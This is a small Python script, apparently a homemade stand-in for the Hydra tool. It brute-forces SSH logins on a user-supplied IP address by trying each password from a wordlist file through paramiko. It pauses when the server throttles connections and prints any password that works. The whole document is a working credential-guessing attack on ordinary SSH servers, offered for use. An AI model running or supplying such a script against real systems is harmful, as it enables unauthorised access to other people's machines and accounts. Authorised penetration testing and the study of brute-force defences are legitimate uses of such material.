import time
import socket
import paramiko

def HydraAutomator():
    target_ip = input("\nPlease enter the IP: ") 
    target_user = input("\nEnter the username that you want to try to login: ")
    wordlist = "password.txt"

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"\nTarget IP: {target_ip}")
    print(f"\nTarget User: {target_user} - Starting login attempts...")

    try:
        with open(wordlist, "r", encoding="utf-8") as file:
            for line in file:
                test_password = line.strip()
               
                try:
                    ssh_client.connect(
                        hostname=target_ip,
                        username=target_user,
                        password=test_password,
                        timeout=3
                    )
                    print(f"\n[+] Password found: {test_password}")
                    ssh_client.close()
                    return
             
                except paramiko.AuthenticationException:
                    print(f"[-] Password '{test_password}' failed")
                    continue

                except (paramiko.SSHException, socket.error) as e:
                    #Ssh may end connection if to many connection attempt made so fast
                    time.sleep(2)

                except Exception as e:
                    print(f" An unexpected Exception occurred: {e}")
                    break   
    
    except FileNotFoundError:
        print(f"\nError: Cannot find the wordlist '{wordlist}'")
    
    finally:
        ssh_client.close()

    print("\nExecution of hydra finished password cannot be found")    

if __name__ == "__main__":
    HydraAutomator()

